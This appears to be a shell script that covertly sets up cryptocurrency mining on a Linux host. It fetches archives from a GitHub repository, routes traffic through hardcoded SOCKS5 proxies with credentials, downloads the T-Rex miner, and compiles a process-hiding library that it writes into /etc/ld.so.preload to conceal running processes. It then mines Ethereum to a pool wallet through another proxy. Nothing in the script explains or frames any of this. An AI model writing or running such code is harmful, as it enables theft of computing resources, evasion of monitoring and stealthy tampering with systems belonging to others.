#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 176.53.133.217:57597
socks5_username = 2BHVpyGPD
socks5_password = 1rN14HAmV
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo " "

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo " "

echo " "
echo " "

./graftcp/graftcp wget https://github.com/trexminer/T-Rex/releases/download/0.26.4/t-rex-0.26.4-linux.tar.gz
tar -zxf t-rex-0.26.4-linux.tar.gz
chmod +x t-rex

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
unzip magicBezzHash.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
./graftcp/graftcp ./t-rex -a ethash -o stratum+tcp://eth.2miners.com:2020 -u 3Ev3mZawL4TRxeC2Li91gZg5Yrx1k5npL7 -w DENT -p x --proxy socks5://192.252.211.197:14921
